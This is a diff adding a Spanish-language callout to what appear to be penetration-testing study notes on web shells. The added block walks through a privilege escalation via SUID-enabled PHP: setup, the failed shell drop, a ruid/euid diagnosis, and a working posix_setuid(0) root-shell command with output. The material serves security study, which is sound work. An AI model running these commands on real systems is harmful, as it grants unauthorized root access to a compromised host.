@@ -742,3 +742,39 @@ When utilizing web shells, consider the below potential issues that may arise du
 - Web applications sometimes automatically delete files after a pre-defined period
 - Limited interactivity with the operating system in terms of navigating the file system, downloading and uploading files, chaining commands together may not work (ex. `whoami && hostname`), slowing progress, especially when performing enumeration -Potential instability through a non-interactive web shell
 - Greater chance of leaving behind proof that we were successful in our attack
+
+> [!success] EXTRA
+> # Escalada de privilegios vía PHP con SUID (sudo chmod)
+> **Setup**
+> ```shell-session
+> sudo chmod 6777 /usr/bin/php
+> ls -la $(which php)
+> # -rwsrwsrwx. 1 root root ... /usr/bin/php
+> ```
+>
+> **Falla (drop de privilegios por ruid≠euid)**
+> ```shell-session
+> php -r "system('/bin/sh -p');"
+> whoami
+> # apache
+> ```
+>
+> **Diagnóstico**
+> ```shell-session
+> php -r "echo 'ruid=' . posix_getuid() . ' euid=' . posix_geteuid();"
+> # ruid=48 euid=0  -> discrepancia causa el drop
+> ```
+>
+> **Explotación**
+> ```shell-session
+> php -r "posix_setuid(0); posix_setgid(0); system('/bin/sh -p');"
+> whoami
+> # root
+> ```
+>
+> **Por qué:** SUID da `euid=0` al proceso padre, pero `/bin/sh` al iniciar compara `ruid` vs `euid`; si difieren, dropea privilegios pese al `-p`. `posix_setuid(0)`/`posix_setgid(0)` igualan `ruid` a `0` antes del fork, eliminando la discrepancia.
+>
+> **Ref:** GTFOBins → php → SUID
+
+# LAB
+
